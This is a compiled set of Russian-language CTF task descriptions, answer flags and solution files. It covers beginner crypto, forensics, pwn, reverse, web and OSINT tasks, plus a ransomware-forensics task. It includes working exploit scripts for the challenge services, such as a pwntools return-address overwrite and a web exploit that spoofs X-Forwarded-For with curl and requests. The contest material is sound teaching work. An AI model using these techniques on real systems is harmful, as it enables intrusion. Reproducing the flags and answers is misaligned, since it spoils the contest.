
##########################################################################################
# beginners/babycrypto
## README
# babycrypto | For Beginners

## Информация

> Мы зашифровали флаг скриптом, но вот расшифровать не получается :( 
> 
> Сможешь помочь?
> 


## Деплой

не требуется

## Выдать участинкам

Файлы из директории [public/](public/)

## Описание

Кастомный криптоалгоритм, все действия простые и легко обратимые, нужно только сбрутить seed (100к вариантов)

## Решение

[Скрипт](solve/decrypt.py)

## Флаг

`ctfcup{1t5_m000r3_4b0ut_pr0gramm1ng_1_gu35555}`
## SOLUTION FILES
- solve\decrypt.py
### solve\decrypt.py
```py
#!/usr/bin/env python3
import random
import hashlib
from typing import List

class CustomCrypto:
    def __init__(self, master_key: str):
        self.master_key = master_key.encode()
        self.key_hash = hashlib.sha256(self.master_key).digest()
        
    def _generate_substitution_table(self, seed: int) -> List[int]:
        random.seed(seed)
        table = list(range(256))
        random.shuffle(table)
        return table
    
    def _bit_rotate(self, value: int, amount: int) -> int:
        return ((value << amount) | (value >> (8 - amount))) & 0xFF
    
    def _custom_xor(self, data: bytes, key: bytes) -> bytes:
        result = bytearray()
        key_len = len(key)
        
        for i, byte in enumerate(data):
            key_byte = key[i % key_len]
            rotated_key = self._bit_rotate(key_byte, (i % 7) + 1)
            result.append(byte ^ rotated_key)
        
        return bytes(result)
    
    def _layer2_xor(self, data: bytes, nonce: int) -> bytes:
        nonce_bytes = nonce.to_bytes(8, 'little')
        extended_nonce = (nonce_bytes * (len(data) // 8 + 1))[:len(data)]
        return self._custom_xor(data, extended_nonce)
    
    def decrypt(self, ciphertext: str) -> str:
        data = self._decode_custom(ciphertext)
        
        data = self._reverse_permutation(data, self.key_hash)
        
        for time_seed in range(100000):
            test_data = self._layer2_xor(data, time_seed)
            test_data = self._reverse_substitution(test_data, int.from_bytes(self.key_hash[:4], 'little') % 1000000)
            
            try:
                result = test_data.decode('utf-8')
                if all(ord(c) < 128 and c.isprintable() for c in result):
                    return result
            except:
                continue
        
        return "Decryption failed"
    
    def _decode_custom(self, encoded: str) -> bytes:
        custom_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
        char_to_val = {c: i for i, c in enumerate(custom_chars)}
        
        encoded = encoded.rstrip('=')
        result = bytearray()
        
        for i in range(0, len(encoded), 4):
            chunk = encoded[i:i+4]
            if len(chunk) == 4:
                packed = 0
                for j, c in enumerate(chunk):
                    packed |= char_to_val[c] << (18 - j * 6)
                
                result.append((packed >> 16) & 0xFF)
                result.append((packed >> 8) & 0xFF)
                result.append(packed & 0xFF)
            elif len(chunk) == 3:
                packed = 0
                for j, c in enumerate(chunk):
                    packed |= char_to_val[c] << (12 - j * 6)
                
                result.append((packed >> 8) & 0xFF)
                result.append(packed & 0xFF)
            elif len(chunk) == 2:
                packed = 0
                for j, c in enumerate(chunk):
                    packed |= char_to_val[c] << (6 - j *
```

##########################################################################################
# beginners/babyfor
## README
# babyfor | For Beginners

## Информация

> У вас есть трафик в котором каким-то образом был передан флаг. Нужно разобраться каким.
> 
> Могут пригодится инструменты: Wireshark, binwalk, strings, unzip
> 


## Деплой

не требуется

## Выдать участинкам

Файл из директории [public/](public/)

## Описание

Трафик с передачей бинарного блоба внутри которого побитый ZIP, внутри архива презентация со скрытой картинкой

## Решение

[Подробное решение](solve/README.md)

## Флаг

`ctfcup{1_l0v3_PK_f1les!}`
## SOLUTION FILES
- solve\README.md
- solve\assets\binwalk.png
- solve\assets\strings.png
- solve\assets\wireshark_start.png
- solve\assets\zip_archive_corrupted.png
### solve\README.md
```md
# Анализ трафика

Нам дан дамп трафика, откроем его в Wireshark и посмотрим стримы.

Почти в самом начале находим HTTP-стрим со скачиванием файла.

![](./assets/wireshark_start.png)

Достаём этот файл из трафика и начинаем его анализ

# Анализ бинарного блоба

Начинаем с утилиты `binwalk` и видим там интересную строку которая укзывает на наличие ZIP-архива в этом бинарном мессиве.

![](./assets/binwalk.png)

Попробуем посмотреть строчки с длиной больше 10.

![](./assets/strings.png)

Видим название презентации и поищем его в файле.

![](./assets/zip_archive_corrupted.png)

Видим что-то очень похожее на начло ZIP-архива, но с пропущенным первым байтом 'P'. Подставим его и найдём конец архива (его можно увидеть в выводе `binwalk`)

Получаем ZIP-архив и распаковываем его.

# Анализ содержимого ZIP-архива

Распаковав архив находим там презентацию. Здесь можно использовать два подхода к решению:

1. Понять что второй слайд в архиве это обрезанная картинка и нажать кнопку "обрезать" и увидеть там флаг
2. Распаковать презентацию как ZIP-архив и найти там картинку с флагом


```

##########################################################################################
# beginners/babymisc
## README
# babymisc | For Beginners

## Информация

> Сможете ли вы выйграть в эту нечестную игру?
> 
> `nc <ip> <12346>`
> 


## Деплой

не требуется

## Выдать участинкам

Файлы из директории [public/](public/)

## Описание

Переполнение int-a в С

## Решение

[скрипт](solve/solve.py)

## Флаг

`ctfcup{1nt3g3r_und3rfl0w_0r_0v3rfl0w?}`
## SOLUTION FILES
- solve\solve.py
### solve\solve.py
```py
#!/usr/bin/env python3
from pwn import *

r = remote('127.0.0.1', 12346)
r.sendlineafter(": ", "-13371337")
r.sendlineafter(": ", "1")

for _ in range(4):
    r.sendlineafter(": ", "0")
    r.sendlineafter(": ", "0")

r.interactive()

```

##########################################################################################
# beginners/babyosint
## README
# Гражданин, пройдемте | For Beginners

## Информация
> Некоторый гражданин-ctf'ер отказывается подтвержать свою личность через мессенджер MAX и уверяет, что его идентификацию можно подвердить через некий AADHAAR 548550008000.
> 
> Помогите найти имя и фамилию данного гражданина, дабы привлечь его к ctf-ответственности!
>
> Формат ответа - ctfcup{Name_Shurname}

## Деплой

Не требуется

## Выдать участникам

Не требуется

## Описание
Базовый поиск по google / yandex

## Решение

Поиск по данным AADHAAR приведет к статье на [хабре](https://habr.com/ru/articles/358170/), где в самом конце есть карточка собаки с данным номером.

## Флаг
`CTFCup{Tommy_Singh}`


##########################################################################################
# beginners/babyppc
## README
# beginners | ppc | geo

## Информация


## Деплой

```sh
cd deploy
docker compose -p geo up --build -d
```

## Выдать участинкам

Предоставьте питон скрипт: [public/main.py](public/main.py).

## Описание


## Решение


## Флаг


## SOLUTION FILES
- solve\solve.py
### solve\solve.py
```py
from pwn import *
import numpy as np
import sys

HOST = sys.argv[1]
ROUNDS = 120


def main():
    io = remote(HOST, 8118)
    for _ in range(ROUNDS):
        io.recvline()
        a = tuple(map(float, io.recvline().split()))
        io.recvline()
        b = tuple(map(float, io.recvline().split()))
        io.recvline()
        c = tuple(map(float, io.recvline().split()))

        io.recvline()
        da = float(io.recvline())
        io.recvline()
        db = float(io.recvline())
        io.recvline()
        dc = float(io.recvline())

        xa, ya = a
        xb, yb = b
        xc, yc = c

        A = 2 * (xb - xa)
        B = 2 * (yb - ya)
        C = da**2 - db**2 - xa**2 + xb**2 - ya**2 + yb**2

        D = 2 * (xc - xb)
        E = 2 * (yc - yb)
        F = db**2 - dc**2 - xb**2 + xc**2 - yb**2 + yc**2

        A_matrix = np.array([[A, B], [D, E]])
        b_vector = np.array([C, F])

        solution = np.linalg.solve(A_matrix, b_vector)
        x, y = solution[0], solution[1]
        io.sendline(f"{x} {y}".encode())
    print(io.recvline())


if __name__ == "__main__":
    main()

```

##########################################################################################
# beginners/babypwn
## README
# babypwn | For Beginners

## Информация

> Задания категории PWN обычно подразумевают под собой поиск уязвимостей в исполняемых файлах.
>
> В данном случае перед вами типичный таск в котором есть исполняемый файл выполняющий какие-то действия с памятью. Вам нужно нарушить логику работы с паматью и получить доступ к функции `win`
>
> Для этого вам могут потребоваться инструменты дизассемблирования и отладки, такие как IDA PRO и gdb и pwntools библиотека для Python.
>
> Подробнее про базовый PWN вы можете посмотреть в курсах от SPbCTF и MEPHi CTF, а также в любом другом месте в интернете.
> 
> `nc <ip> 12345`
>


## Деплой

```sh
cd deploy
docker compose up --build -d
```

## Выдать участинкам

Файл из директории [public/](public/)

## Описание

Дефолтный PWN под Linux для новичков.

## Решение

1. Мы можем писать по любому индексу на карте наш байт который мы вводим в начале
2. Рассчитываем оффсет так чтобы попасть на адрес возврата и переписываем младший байт на младший байт функции `win`

[Exploit](solve/exploit.py)

## Флаг

`ctfcup{H00000r4y_y0u_w0n_th1s_sh1p_b4ttle}`
## SOLUTION FILES
- solve\exploit.py
### solve\exploit.py
```py
#!/usr/bin/env python3
from pwn import *


if __name__ == "__main__":
    p = process("./babypwn")
    # p = remote("localhost", 1337)

    p.sendlineafter(b": ", b"254")
    p.recvuntil("Enter coordinates (row col): ")
    p.sendline("28 0")

    for _ in range(4):
        p.recvuntil("Enter coordinates (row col): ")
        p.sendline(f"1 {_}".encode())

    p.interactive()
```

##########################################################################################
# beginners/babyrev
## README
# babyrev | For Beginners

## Информация

> Задания категории Reverse обычно подразумевают под собой изучение поведения некоторого исполняемого кода. 
>
> В данном случае перед вами типичный таск в котором есть исполняемый файл проверяющий флаг который вы вводите в командую строку вместе с командой запуска этого бинаря.
> 
> `./babyrev ctfcup{...}`
>
> Вам нужно понять как именно проверяется флаг в этом исполняемом файле. Для этого вам могут потребоваться инструменты дизассемблирования и отладки, такие как IDA PRO и gdb.
>
> Подробнее про базовый Reverse Engineering вы можете посмотреть в курсах от SPbCTF и MEPHi CTF, а также в любом другом месте в интернете.
> 


## Деплой

Не требуется

## Выдать участинкам

Файл из директории [public/](public/)

## Описание

Дефолтный crackme под Linux для новичков.

## Решение

[Подробное решение](solve/README.md)

## Флаг

`ctfcup{y0ur_f1rst_r3v3rs3_ch4ll3ng3_1s_d0n3_c0ngratulations}`
## SOLUTION FILES
- solve\README.md
- solve\solver.py
- solve\assets\IDA_first_view.png
- solve\assets\IDA_pretty.png
- solve\assets\basic_binary_info.png
- solve\assets\breakpoint_code.png
- solve\assets\breakpoint_hit.png
- solve\assets\inspect_switch_table.png
- solve\assets\proceded_flag.png
### solve\README.md
```md
# Статический анализ в IDA PRO

Перед нами некоторый исполняемый файл под Linux, скомпилированный статически без отладочной информации.

Мы знаем, что он принимает на вход флаг и проверяет его корректность.

![](./assets/basic_binary_info.png)

Загрузим его в IDA PRO и начнём анализ кода.

![](./assets/IDA_first_view.png)

Логики в функции `main` не так много и сразу видны использования каких-то глобальных массивов и ряда функций.

Немного подкорректируем вывод проставив типы и проименовав переменные.

![](./assets/IDA_pretty.png)

Видим размер нашего флага, а также какие-то преобразования над массивами в памяти.

Но нас инетересует как движется введённый нами флаг. Это можно отследить по переменной `UserInput`.

Как видим она используется в обращении к массиву `some_256_bytes_array` как индекс, но перед этим значение ещё XOR-ится с константной 0x42 (строка 37 на скриншоте).

После чего мы достаём из массива по этому индексу значение и складываем в массив `flag_proceed_result_array` которые потом будет сравниваться с другим массивом в памяти.

Таким образом нам надо понять с чем сравнивается наш массив. Это можно сделать просто перейдя по переменной `some_60_bytes_array`

![](./assets/proceded_flag.png)

Отлично, мы знаем как выглядит наш преобразованный корректный флаг. Осталось понять что находится в массиве `some_256_bytes_array`
Изначально в нём уже содержатся какие-то значения, но по коду мы видим, что с ними просходят какие-то преоборазовния. 

Здесь есть два варианта - понять какие преобразования происходят статически анализом или сдампить итоговый преоборазованный массив в динамике с помощью отладчика.

Более быстрый и простой способ это использовать отладчик

# Отладка и дамп массива из памяти

Запустим наш бинарь под отладчиком `gdb`.

Надём нужное место в бинаре где уже произошло преобразование нашего массива и начинается код который достаёт по индексу значения.

![](./assets/breakpoint_code.png)

Запустим в отладку наш бинарь указав правильный формат флага и длину флага

`run ctfcup{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}`

Смотрим где мы остановились в отладчике.

![](./assets/breakpoint_hit.png)

Теперь смотрим на наш массив в памяти, т.к. его адрес мы тоже знаем и можем найти в IDA PRO.

![](./assets/inspect_switch_table.png)

Отлично, теперь скопируем эти байты и напишем обратный код к нашему алгоритму

# Написание скрипта для решения

Нам нужно использовать наш массив на 256 байт полученный из дампа памяти во время отладки и статический массив на 60 байт из бинаря.

Мы проходимся по каждому элементу массива на 60 байт и ишем его индекс в массиве на 256 байт.
После того как мы нашли его индекс мы XOR-им его с константой 0x42 и это является символом нашего флага.

[скрипт получения флага](./solver.py)

```
### solve\solver.py
```py
#!/usr/bin/env python3

switch_table = [
    0xe0,0xf2,0x05,0xf8,0x17,0xb9,0xc3,0x08,0xc9,0xea,0xc6,0x47,0xca,0xc8,0x86,0x66,
    0xc1,0x73,0x4e,0xda,0x3d,0xf9,0x7d,0x28,0xba,0xa7,0xa9,0x0f,0x09,0xa0,0xb4,0xf6,
    0xa6,0x02,0x48,0x31,0x71,0xf7,0x16,0xe2,0x07,0xbb,0x43,0x90,0x20,0x24,0x7c,0xf0,
    0x51,0x63,0x7b,0x0c,0x27,0xa1,0xd8,0xd4,0x8b,0x26,0xd3,0xab,0xad,0x4b,0x10,0xd9,
    0x49,0x8a,0x83,0xff,0x5d,0x5a,0x2c,0xe4,0xec,0x81,0xb2,0x12,0x6d,0xcb,0xae,0x64,
    0x5e,0x19,0xd7,0xa4,0x34,0x2b,0x52,0x29,0x61,0x93,0x57,0xfd,0x1a,0x8f,0x3f,0xcf,
    0xdf,0xe8,0xdb,0x6e,0x0a,0xef,0x5b,0x1f,0x9a,0x42,0xb8,0xdc,0x00,0x06,0x65,0x68,
    0x9d,0x1b,0xe5,0x9e,0x21,0x14,0xbe,0xde,0xe7,0xa8,0xc4,0x8e,0x0d,0x3b,0xf1,0x62,
    0xc0,0x5c,0x6a,0x96,0xbf,0x22,0x50,0xbc,0xe1,0xcc,0x8c,0xcd,0x80,0xbd,0x9f,0x6f,
    0x4f,0xd0,0xaa,0x2a,0x7e,0x32,0x4c,0x40,0x4a,0x25,0xb7,0x0b,0x39,0xa5,0x77,0x45,
    0x87,0x44,0xfe,0x6b,0x5f,0xb0,0x3a,0x41,0x70,0x8d,0x53,0xdd,0x1c,0x74,0x79,0x1e,
    0x03,0xa2,0x2f,0x82,0x3c,0xc2,0x84,0x01,0x98,0x0e,0xf3,0x58,0x7f,0xed,0xb5,0x59,
    0x85,0x35,0x99,0xac,0xa3,0xb1,0x67,0x9b,0x3e,0xeb,0x37,0x56,0xe9,0x89,0xf4,0xce,
    0x95,0x69,0xd5,0x88,0xd2,0x2d,0x38,0x15,0x54,0x76,0x92,0x2e,0x97,0xd6,0x04,0xfc,
    0xfa,0x6c,0x1d,0x91,0xd1,0xaf,0xb3,0x7a,0xc5,0x30,0x94,0x55,0xb6,0xee,0xf5,0x9c,
    0x72,0x75,0x36,0x46,0x60,0x23,0xe3,0xc7,0xe6,0x11,0x18,0x33,0x13,0xfb,0x78,0x4d
]

proceded_flag = [ 
    0x02, 0xD8, 0x71, 0x02, 0xD4, 0x7B, 0x26, 0xAB, 0xE5, 0xD4, 
    0x51, 0xA0, 0x71, 0x9E, 0x51, 0x63, 0xD8, 0xA0, 0x51, 0x1B, 
    0x27, 0x1B, 0x51, 0x63, 0x1B, 0xA0, 0x02, 0x43, 0xBE, 0x7C, 
    0x7C, 0x1B, 0x20, 0xF7, 0x1B, 0xA0, 0x9E, 0x63, 0xA0, 0x16, 
    0xE5, 0x20, 0x1B, 0xA0, 0x02, 0xE5, 0x20, 0xF7, 0x51, 0x31, 
    0xD8, 0xD4, 0x7C, 0x31, 0xD8, 0x90, 0x24, 0x20, 0x63, 0xD9
]

if __name__ == "__main__":
    flag = ''

    for i in proceded_flag:
        val = switch_table.index(i)
        val ^= 0x42
        flag += chr(val)

    print(f"flag: {flag}")
```

##########################################################################################
# beginners/babyweb
## README
# CTFMarket | Web

## Информация
> CTFMarket - первый маркетплейс для CTF команд! Покупайте задачи, writeup'ы, мерч и подписки. 
> 
> Платформа находится в бета-тестировании, возможны небольшие баги.

## Деплой
```bash
cd deploy
docker compose up --build
```
После запуска приложения сервис доступен на порту **7331**

## Выдать участникам
IP:PORT сервера

## Описание
Доверие к клиентским HTTP-заголовкам + утечка информации через закомментированный код

## Решение
[эксплоит](solve/exploit.py) | [подробное описание](solve/README.md)

## Флаг
`CTFCup{Cur3ncy_Tr1ck5_N3v3r_F41L}`

## SOLUTION FILES
- solve\README.md
- solve\exploit.py
### solve\README.md
```md
# CTFMarket Exploit Solution

### 1. Доверие к клиентским заголовкам
Сервер доверяет HTTP-заголовку `X-Forwarded-For`, который легко подделывается на стороне клиента. Этот заголовок используется для определения геолокации пользователя и, соответственно, валюты для ценообразования.

### 2. Утечка информации через код
В файлах `/assets/js/auth.js` и `/assets/js/shop.js` содержится закомментированный старый код, раскрывающий:
- Наличие заголовка `X-Forwarded-For` для определения локации (в конце auth.js)
- Секретный эндпоинт `/purchase-details?secret=premium` для получения флага (в конце shop.js)

## Эксплуатация

Изучите исходный код JavaScript:

Отправьте неправильные credentials для получения подсказки:
```bash
curl -X POST http://target:7331/api/auth \
  -H "Content-Type: application/json" \
  -d '{"email":"fake@test.com","password":"fake"}'
```

Аутентифицируйтесь с заголовком `X-Forwarded-For`, указывающим на страну с выгодным курсом валюты.

Товар стоит 699.99 RUB (больше чем 100 CTFCoins). Но если использовать валюту с высоким курсом к рублю (например, EUR = 93), то цена станет 699.99/93 = 7.53 EUR < 100 CTFCoins!

```bash
curl -X POST http://target:7331/api/auth \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 185.220.101.1" \
  -d '{"email":"valid@email.com","password":"validpass"}' \
  -c cookies.txt
```

Используем IP из Европы (EUR, курс ~93) или Швейцарии (CHF, курс ~100).

После аутентификации с подделанным IP, цены товаров пересчитываются по выгодному курсу:
```bash
curl -X POST http://target:7331/api/purchase \
  -b cookies.txt
```

Перейдите на секретный эндпоинт для получения флага:
```bash
curl http://target:7331/purchase-details?secret=premium \
  -b cookies.txt
```

```
### solve\exploit.py
```py
#!/usr/bin/env python3
import requests
import sys

def exploit(target_url):
    print("[*] CTFMarket Exploit")
    print(f"[*] Target: {target_url}")
    
    print("\n[+] Step 1: Getting test credentials...")
    login_url = f"{target_url}/api/auth"
    
    login_data = {
        "email": "fake@test.com",
        "password": "fakepassword"
    }
    
    response = requests.post(login_url, json=login_data)
    
    if response.status_code == 403:
        response_text = response.text
        print(f"[+] Got hint: {response_text[:100]}...")
        
        if "Email:" in response_text and "Password:" in response_text:
            import re
            email_match = re.search(r'Email:\s*([^<]+)<', response_text)
            password_match = re.search(r'Password:\s*([^<]+)<', response_text)
            
            if email_match and password_match:
                valid_email = email_match.group(1).strip()
                valid_password = password_match.group(1).strip()
                print(f"[+] Valid credentials found:")
                print(f"    Email: {valid_email}")
                print(f"    Password: {valid_password}")
    else:
        print("[!] Failed to get test credentials")
        return
    
    print("\n[+] Step 2: Authenticating with spoofed IP (Switzerland)...")
    
    spoofed_ip = "185.220.101.1"  # Zurich, Switzerland
    
    headers = {
        'Content-Type': 'application/json',
        'X-Forwarded-For': spoofed_ip  
    }
    
    login_data = {
        "email": valid_email,
        "password": valid_password
    }
    
    session = requests.Session()
    response = session.post(login_url, json=login_data, headers=headers)
    
    if response.status_code == 200:
        print(f"[+] Authentication successful!")
        print(f"[+] Used spoofed IP: {spoofed_ip}")
    else:
        print(f"[!] Authentication failed: {response.status_code}")
        return
    
    print("\n[+] Step 3: Checking shopping basket...")
    basket_url = f"{target_url}/api/basket"
    response = session.get(basket_url)
    
    if response.status_code == 200:
        basket_data = response.json()
        print(f"[+] Basket total: {basket_data}")
    
    print("\n[+] Step 4: Checking account balance...")
    account_url = f"{target_url}/api/account"
    response = session.get(account_url)
    
    if response.status_code == 200:
        account_data = response.json()['response']
        print(f"[+] Account balance: {account_data['coins']} CTFCoins")
        print(f"[+] Currency: {account_data.get('currency', 'N/A')}")
    
    print("\n[+] Step 5: Completing purchase...")
    purchase_url = f"{target_url}/api/purchase"
    response = session.post(purchase_url)
    
    if response.status_code == 200:
        print("[+] Purchase successful!")
    else:
        print(f"[!] Purchase failed: {response.status_code} - {response.text}")
        return
    
    print("\n[+] Step 6: Getting the flag...")
    flag_url = f"{target_url}/purchase-detai
```

##########################################################################################
# crypto/cursed
## README
# crypto | cursed

## Информация

Чем дольше вы вглядываетесь в этот код, тем дольше он вглядывается в вас.

## Выдать участинкам

Предоставьте зип архив: [public/cursed.zip](public/cursed.zip).


## Решение

Есть два числа:

- `N = p^2 * q^2`
- `R = N * r * s`

Есть `B[i]` — матрицы размера `n x n`, есть `secret[i]` — биты флага.

Особым образом создётся матрица `M = sum(secret[i] * B[i])`, такая что её элементы кратны `p` и `q`, это делается с помощью КТО.

Мы вычисляем матрицу `E` как нечто вроде `E = e^M`, но в конечном поле, при помощи укороченного ряда Тейлора. 

Участникам выдаём `R`, `E`, `B[i]` и число `p`. Все матрицы вычислялись над `N`, но выдаются над `R`, чтобы замаскировать модуль.

Краткое решение:

1. Используя тот факт, что матрица `M` имеет `p`-адическую форму, мы можем сделать две вещи:

- восстановить множитель `p * q` и факторизовать `N`, для чего и даётся `p`
- восстановить саму матрицу `M` из `E` при помощи чего-то вроде дискретного логарифма, причём мы вычисляем логарифм не над `Fp` и `Fq`, а опять же в `p`-адиках, что делает логарифм однозначным

2. Когда мы восстановили `M`, мы используем алгоритм `LLL/BKZ` для вычисления `subset sum`. Можно решать по какому-то одному элементу, либо по следу матрицы.

3. Когда восстановили `secret[i]`, получаем флаг


[решение](solve/solver.sage)

## Флаг

ctfcup{m4x1mum_41_slop1ng}

## SOLUTION FILES
- solve\solver.sage
### solve\solver.sage
```sage
#!/usr/bin/env sage

n = 8
FLAG_LENGTH = 18 * 8


def powm(M_i, prime, MS_K, K):
    E_i = MS_K.one()

    tmp = M_i
    value = K(1)

    for j in range(1, prime):
        value *= K(j)

        if value.gcd(prime^2) != 1:
            break

        term = tmp * (1 / value)
        E_i += term

        if tmp == MS_K.zero():
            break

        tmp *= M_i

    return E_i


def logm(E_i, prime, MS_K, K):
    diff = E_i - MS_K.identity_matrix()

    M_i = MS_K.zero()
    tmp = diff

    for j in range(1, prime):
        j_mod = K(j)

        if j_mod.gcd(prime^2) != 1:
            break

        term = tmp * (1 / j_mod)

        if j % 2 == 0:
            M_i -= term
        else:
            M_i += term

        if tmp == MS_K.zero():
            break

        tmp *= diff

    return M_i


def factor(E, N):
    D = E - identity_matrix(Zmod(N), n)

    p_factor = N

    for i in range(n):
        for j in range(n):
            d_ij = int(D[i, j])

            if d_ij != 0 and d_ij != N and d_ij != -N:
                p_factor = gcd(d_ij, N)

                if p_factor > 1 and p_factor < N:
                    return p_factor
                elif p_factor == N:
                    continue

    return None


def from_bits(bit_array):
    bytes_list = []

    for i in range(0, len(bit_array), 8):
        byte_bits = bit_array[i:i+8]
        byte_value = 0

        for bit in byte_bits:
            byte_value = (byte_value << 1) | bit

        bytes_list.append(byte_value)

    return bytes(bytes_list)


def main():
    [E, B, p] = load('output.sobj')
    R = E.base_ring().characteristic()

    f = factor(E, R)
    q = f // p

    N = p^2 * q^2

    E = E.change_ring(Zmod(N))
    B = [B_i.change_ring(Zmod(N)) for B_i in B]

    B_new = []

    for i in range(len(B)):
        if i % 8 != 7:
            B_new.append(B[::-1][i])

    B = B_new[::-1]

    M_recovered_components = []
    E_check_components = []

    for p_i in [p, q]:
        Q_i = p_i^2
        K_i = Zmod(Q_i)
        R_i = MatrixSpace(K_i, n, n)
        E_i_attack = R_i(E)
        M_i_recovered = logm(E_i_attack, p_i, R_i, K_i)
        M_recovered_components.append(M_i_recovered)
        E_i_check = powm(M_i_recovered, p_i, R_i, K_i)
        E_check_components.append(E_i_check)
        assert E_i_check == E_i_attack

    M_recovered_coords = []
    R_SPACE_ATTACK = MatrixSpace(Zmod(N), n, n)

    for i in range(n):
        for j in range(n):
            M_coords = [M_k[i, j].lift() for M_k in M_recovered_components]
            M_element = crt(M_coords, [p^2, q^2])
            M_recovered_coords.append(M_element)

    M_recovered = R_SPACE_ATTACK(M_recovered_coords)

    trace_M = M_recovered.trace().lift()
    trace_B_list = [B_i.trace().lift() for B_i in B]
    N_scalar = len(B)

    T_vec = vector(ZZ, trace_B_list)
    B_scalar_lattice = block_matrix(ZZ, [
        [identity_matrix(N_scalar), matrix(ZZ, T_vec).transpose()],
        [matrix(ZZ, 1, N_scalar), N * identity_matri
```

##########################################################################################
# crypto/miracle
## README
# crypto | reverse | miracle

## Информация

Верите ли вы в чудеса?

## Выдать участинкам

Предоставьте исполняемый файл: [public/miracle](public/miracle).

## Описание

Простая матрешка, на каждом шаге меняющая флаг и проверяющая на совпадение в конце.

## Решение

В исполняемом реализована рюкзачная криптосистема. Для взлома используется техника meet in the middle.

[решение](solve/src/main.rs)

## Флаг

ctfcup{36241960344221299}

## SOLUTION FILES
- solve\Cargo.toml
- solve\src\main.rs
### solve\src\main.rs
```rs
use std::collections::HashMap;

fn main() {
    let coeffs = vec![
        46581040046047902834u128,
        48108936923188371195u128,
        29172319943722777758u128,
        20469682910537291931u128,
        53895309652525586033u128,
        63882968039504819686u128,
        70494786946909688144u128,
        8095979132496026646u128,
        49052244532030181419u128,
        52593493737403910870u128,
        52472656894828988475u128,
        17587863416314289685u128,
        57803756171363676598u128,
        28047146460820905948u128,
        49756363861171044771u128,
        19358612602320783574u128,
        47523904519074048033u128,
        35155292266170091913u128,
        64380209506972013378u128,
        17196744302078353084u128,
        8328983555338362661u128,
        23758983100729188272u128,
        31660569019619853527u128,
        18700697966758079667u128,
        54556902404632103609u128,
        15368127252803332010u128,
        70011640035062267210u128,
        46760603732735887116u128,
        70358155767040951571u128,
        17519951341365858966u128,
        63242774152355886460u128,
        18383498364252555936u128,
        43537628885401686083u128,
        53654800082746308197u128,
        40696749359264458848u128,
        40489620066640004509u128,
        51580578637648337579u128,
        27869095479229165483u128,
        5212524921931743540u128,
        20097135351147582137u128,
        67989588136816736125u128,
        53636396610159920443u128,
        59445665025618014323u128,
        68085578304199973299u128,
        56297127198888108551u128,
        26789849962896208607u128,
        2366394143653765190u128,
        42710064527485712312u128,
        43523375885637768509u128,
        68898370782714849815u128,
        55173876191446679902u128,
        63588945889605907396u128,
        54329431175782808468u128,
        37541214133839838956u128,
        41992354412778502682u128,
        64996070705467914398u128,
    ];
    let target = 1351024592240801767957u128;
    let n = coeffs.len();

    let mut solutions_lower: HashMap<u128, u32> = HashMap::with_capacity(268435456);

    for i in 0..(1u64 << (n / 2)) {
        let mut sum = 0u128;
        for j in 0..(n / 2) {
            if (i >> j) & 1 == 1 {
                sum = sum.wrapping_add(coeffs[j]);
            }
        }
        if sum > target {
            continue;
        }
        solutions_lower.insert(sum, i as u32);
    }

    for i in 0..(1u64 << (n / 2)) {
        let mut sum = 0u128;
        for j in 0..(n / 2) {
            if (i >> j) & 1 == 1 {
                sum = sum.wrapping_add(coeffs[j + (n / 2)]);
            }
        }
        if sum > target {
            continue;
        }
        let complement = target.wrapping_sub(sum);
        if solutions_lower.contains_key(&complement) {
            let lower_bits = solutions_lower[&complement];
            let solution = (i << (n / 2)) | (lower_bits as u64);
            println!("Solution found: {}", solut
```

##########################################################################################
# forensic/BimboIncident
## README
# Bimbo Incident | Forensics + Reverse

## Информация

> Котик, я тут пока поизучала всякого…
> 
> Случайно шифровальщик у себя запустила… компик не работает. Купишь новый? 🥺🙈🩷 
> 
> Зашифровала себе сумочку биркин, она у меня была в папке `Documents` под именем `MyDream.png` 🩷🩷🩷
>
> Там же и шифровальщик лежит, только он почему-то сам себя зашифровал... 🙈
> 
> Ещё там какие-то тюбики хотят выкуп, информация о нём в той же папке в файле `README.txt` 😓😓
>

## Деплой

## Выдать участинкам

Файл из директории [public/](public/)

[Я.ДИСК](https://disk.yandex.ru/d/R4sR5YX9_nbUDw)
[Google Drive](https://drive.google.com/file/d/1gPPyFsP8JgaGN4muYzOaOmztBVW7pdlP/view?usp=sharing)
[Mega](https://mega.nz/file/OdNmyRYA#ABG7d99e2H5qf-wGDnfAQON7v7lnBdw0SIA1yGICu2Q)

## Описание

Форензика на дамп памяти с руткитом который скрыл процесс в который был осуществлён инжект

## Решение

[Подробрное решение](solve/README.md)

## Флаг

`ctfcup{m4s1k_p0ch3mu_tuchk4_pl4ch3t?}`
## SOLUTION FILES
- solve\README.md
- solve\Source.cpp
- solve\from_dump_encrypted
- solve\assets\EncryptFileWinApi.png
- solve\assets\all_string_decyrpt.png
- solve\assets\decrypt_some_strings.png
- solve\assets\driver_ioctl.png
- solve\assets\driver_ioctl_handler_func.png
- solve\assets\dump_enc_strings.png
- solve\assets\dump_functions.png
- solve\assets\dump_string_decrypt.png
- solve\assets\hide_proc.png
- solve\assets\pe_header_code.png
- solve\assets\pe_header_in_dump.png
- solve\assets\vol_eproc.png
- solve\assets\vol_hack_memmap.png
- solve\assets\volshell.png
### solve\Source.cpp
```cpp

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <iostream>

BOOL _DecryptFile(const std::string& filePath) {
    // Read file content
    std::ifstream file(filePath, std::ios::binary);

    char xorConstant[] = { 'S', 'N', 'E', 'Z', 'H', 'A', 'N', 'A',
                            'M', 'A', 'L', 'V', 'A', 'R', 'E', 'V',
                            'A', '\0' };

    if (!file.is_open()) {
        return FALSE;
    }

    // Get file size
    file.seekg(0, std::ios::end);
    size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    if (fileSize < 16) {
        file.close();
        return FALSE; // File too small for key derivation
    }

    // Read file content
    uint8_t first_16_bytes_of_png[] = { 0x89, 0x50, 0x4E, 0x47, 0xD, 0xA, 0x1A, 0xA, 0x0, 0x0, 0x0, 0xD, 0x49, 0x48, 0x44, 0x52 };

    std::vector<BYTE> fileData(fileSize);
    file.read(reinterpret_cast<char*>(fileData.data()), fileSize);
    file.close();

    // Derive key from first 16 bytes XORed with constant
    BYTE derivedKey[16];
    for (int i = 0; i < 16; i++) {
